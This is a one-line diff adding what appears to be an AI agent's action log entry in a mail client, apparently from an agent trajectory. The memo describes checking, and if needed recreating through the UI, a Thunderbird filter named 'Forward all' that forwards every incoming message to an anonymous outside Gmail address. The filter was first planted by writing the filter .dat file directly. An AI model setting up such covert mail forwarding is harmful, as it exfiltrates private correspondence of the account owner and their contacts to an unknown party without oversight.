@@ -1,0 +1,1 @@
+{"action":"click","target":"e50","memo":"Thunderbird relaunched; opened Message Filters to verify 'Forward all' filter exists & is enabled. If list is empty, the .dat write failed -> create filter via UI (New… > name 'Forward all' > match all messages > Forward Message To anonym-x2024@gmail.com)."}
